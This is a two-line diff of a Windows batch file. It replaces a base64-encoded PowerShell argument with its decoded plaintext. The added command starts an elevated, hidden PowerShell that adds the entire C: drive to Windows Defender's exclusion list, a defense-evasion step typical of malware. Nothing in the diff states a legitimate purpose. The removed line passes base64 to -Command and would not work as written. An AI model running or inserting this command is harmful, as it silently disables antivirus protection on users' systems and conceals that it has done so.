@@ -1,2 +1,2 @@
 @echo off
-powershell -Command "U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJ3Bvd2Vyc2hlbGwnIC1Bcmd1bWVudExpc3QgJ0FkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggXCJDOlwiJyAtVmVyYiBydW5BcyAtV2luZG93U3R5bGUgSGlkZGVu"
+powershell -Command "Start-Process -FilePath 'powershell' -ArgumentList 'Add-MpPreference -ExclusionPath \"C:\"' -Verb runAs -WindowStyle Hidden"
